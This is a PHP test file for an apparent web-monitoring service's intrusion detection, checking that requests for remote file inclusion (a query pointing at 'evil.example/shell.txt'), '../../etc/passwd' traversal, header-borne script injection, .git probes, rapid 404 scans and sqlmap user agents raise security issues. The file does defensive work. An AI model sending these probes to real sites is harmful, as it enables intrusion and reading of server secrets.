<?php

use App\Models\Project;
use App\Services\IngestService;

function securityIngest(Project $project, string $url, string $ip = '203.0.113.7'): void
{
    app(IngestService::class)->ingest($project, [
        ['t' => 'request', 'method' => 'POST', 'url' => $url, 'status_code' => 204, 'duration' => 5_000, 'ip' => $ip],
    ]);
}

test("the app's own address does not count as a remote file in the request", function () {
    $project = Project::factory()->create();

    // An analytics beacon sent a few times by one visitor.
    foreach (range(1, 5) as $ignored) {
        securityIngest($project, 'https://keepitfive.ie/track.php');
    }

    expect($project->issues()->where('type', 'security')->count())->toBe(0);
});

test('a remote file passed in the query is still flagged', function () {
    $project = Project::factory()->create();

    securityIngest($project, 'https://keepitfive.ie/page?include=http://evil.example/shell.txt');

    expect($project->issues()->where('type', 'security')->value('message'))->toContain('lfi_rfi');
});

test('probing a sensitive path is still flagged', function () {
    $project = Project::factory()->create();

    securityIngest($project, 'https://keepitfive.ie/../../etc/passwd');

    expect($project->issues()->where('type', 'security')->value('message'))->toContain('path_traversal');
});

test('the first file audit sets the baseline; a later change is flagged', function () {
    $project = Project::factory()->create();
    $audit = fn (string $envHash) => app(IngestService::class)->ingest($project, [
        ['t' => 'security-audit', 'payload' => ['hashes' => ['.env' => $envHash, 'artisan' => 'b'], 'environment' => ['app_debug' => false, 'session_secure' => true]]],
    ]);

    $audit('a');

    expect($project->issues()->where('type', 'security')->count())->toBe(0)
        ->and($project->fresh()->settings['security_hashes'])->toBe(['.env' => 'a', 'artisan' => 'b']);

    $audit('changed');

    expect($project->issues()->where('type', 'security')->value('message'))->toBe('.env; modified');
});

test('a crawler whose user agent links to a .php page is not a file inclusion', function () {
    $project = Project::factory()->create();

    app(IngestService::class)->ingest($project, [
        ['t' => 'request', 'method' => 'GET', 'url' => 'https://keepitfive.ie/', 'status_code' => 200, 'duration' => 5_000, 'ip' => '173.252.87.4',
            'headers' => json_encode(['user-agent' => ['facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)']], JSON_UNESCAPED_SLASHES)],
    ]);

    expect($project->issues()->where('type', 'security')->count())->toBe(0);
});

test('script injected through a header is still flagged', function () {
    $project = Project::factory()->create();

    app(IngestService::class)->ingest($project, [
        ['t' => 'request', 'method' => 'GET', 'url' => 'https://keepitfive.ie/', 'status_code' => 200, 'duration' => 5_000, 'ip' => '203.0.113.9',
            'headers' => json_encode(['user-agent' => ['<script>alert(1)</script>']], JSON_UNESCAPED_SLASHES)],
    ]);

    expect($project->issues()->where('type', 'security')->value('message'))->toContain('xss');
});

function securityRequest(Project $project, string $url, string $ip, int $status = 200, array $headers = []): void
{
    app(IngestService::class)->ingest($project, [
        ['t' => 'request', 'method' => 'GET', 'url' => $url, 'status_code' => $status, 'duration' => 5_000, 'ip' => $ip,
            'headers' => json_encode($headers, JSON_UNESCAPED_SLASHES)],
    ]);
}

test('an address has one issue, which escalates as its score rises and never drops', function () {
    $project = Project::factory()->create();

    securityRequest($project, 'https://keepitfive.ie/.git/config', '203.0.113.7');
    $issue = $project->issues()->sole();
    expect($issue->priority)->toBe('medium')
        ->and($issue->title)->toBe('Security Issue: MEDIUM Risk from 203.0.113.7');

    securityRequest($project, 'https://keepitfive.ie/.git/HEAD', '203.0.113.7');
    $issue->refresh();
    expect($issue->priority)->toBe('critical')
        ->and($issue->title)->toBe('Security Issue: CRITICAL Risk from 203.0.113.7')
        ->and($issue->occurrences_count)->toBe(2);

    // The score lapses after a day; a milder probe while the issue is open
    // keeps the level it reached.
    $this->travel(25)->hours();
    securityRequest($project, 'https://keepitfive.ie/.git/index', '203.0.113.7');

    expect($project->issues()->sole()->priority)->toBe('critical')
        ->and($project->issues()->sole()->occurrences_count)->toBe(3);

    securityRequest($project, 'https://keepitfive.ie/.git/config', '198.51.100.4');

    expect($project->issues()->count())->toBe(2);
});

test('missing scripts, styles and images are a stale page, not a directory scan', function () {
    $project = Project::factory()->create();

    foreach (range(1, 15) as $n) {
        securityRequest($project, "https://fastidious.gg/build/assets/chunk-{$n}.js", '203.0.113.7', 404);
        securityRequest($project, "https://fastidious.gg/build/assets/app-{$n}.css?v=2", '203.0.113.7', 404);
    }

    expect($project->issues()->count())->toBe(0);
});

test('a run of missing pages is still a directory scan', function () {
    $project = Project::factory()->create();

    foreach (range(1, 12) as $n) {
        securityRequest($project, "https://fastidious.gg/admin-{$n}", '203.0.113.7', 404);
    }

    expect($project->issues()->sole()->message)->toContain('Directory Scanning Detected (Rapid 404s)');
});

test('a security tool named in the user agent is flagged', function () {
    $project = Project::factory()->create();

    securityRequest($project, 'https://keepitfive.ie/', '203.0.113.7', headers: ['user-agent' => ['sqlmap/1.8.2#stable (https://sqlmap.org)']]);

    expect($project->issues()->sole()->message)->toContain('Suspicious Security Tool Detected: sqlmap');
});

test('threat issues from addresses quiet for a day are resolved; audits stay open', function () {
    $project = Project::factory()->create();
    securityRequest($project, 'https://keepitfive.ie/.git/config', '203.0.113.7');
    // From before issues were kept per address: one per risk level.
    $older = $project->issues()->create([
        'hash' => md5('security_critical_198.51.100.4'), 'type' => 'security', 'status' => 'open', 'priority' => 'critical',
        'title' => 'Security Issue: CRITICAL Risk from 198.51.100.4', 'message' => 'Cumulative Threat Score: 120.', 'last_seen_at' => now(),
    ]);
    $audit = $project->issues()->create([
        'hash' => md5("security_fim_{$project->id}"), 'type' => 'security', 'status' => 'open',
        'title' => 'Security: File Integrity Change Detected', 'message' => '.env; modified', 'last_seen_at' => now(),
    ]);

    $this->travel(23)->hours();
    securityRequest($project, 'https://keepitfive.ie/.git/HEAD', '192.0.2.1');
    $this->travel(2)->hours();

    $this->artisan('laraowl:security:resolve-quiet')
        ->expectsOutput('2 quiet threat issue(s) resolved.')
        ->assertSuccessful();

    $statuses = $project->issues()->orderBy('id')->pluck('status', 'title');
    expect($statuses->all())->toBe([
        'Security Issue: MEDIUM Risk from 203.0.113.7' => 'resolved',
        'Security Issue: CRITICAL Risk from 198.51.100.4' => 'resolved',
        'Security: File Integrity Change Detected' => 'open',
        'Security Issue: MEDIUM Risk from 192.0.2.1' => 'open',
    ])
        ->and($older->fresh()->resolved_at)->not->toBeNull()
        ->and($older->activities()->sole()->content)->toBe('resolved automatically: nothing suspicious from this address for 1 day')
        ->and($audit->activities()->count())->toBe(0);
});

test('a resolved address that comes back reopens its issue, rated afresh', function () {
    $project = Project::factory()->create();
    securityRequest($project, 'https://keepitfive.ie/.git/config', '203.0.113.7');
    securityRequest($project, 'https://keepitfive.ie/.git/HEAD', '203.0.113.7');
    $this->travel(25)->hours();
    $this->artisan('laraowl:security:resolve-quiet');

    securityRequest($project, 'https://keepitfive.ie/.git/config', '203.0.113.7');

    $issue = $project->issues()->sole();
    expect($issue->status)->toBe('open')
        ->and($issue->priority)->toBe('medium')
        ->and($issue->resolved_at)->toBeNull()
        ->and($issue->occurrences_count)->toBe(3);
});

test('an ignored address stays ignored', function () {
    $project = Project::factory()->create();
    securityRequest($project, 'https://keepitfive.ie/.git/config', '203.0.113.7');
    $project->issues()->update(['status' => 'ignored']);

    securityRequest($project, 'https://keepitfive.ie/.git/HEAD', '203.0.113.7');

    expect($project->issues()->sole()->status)->toBe('ignored');
});
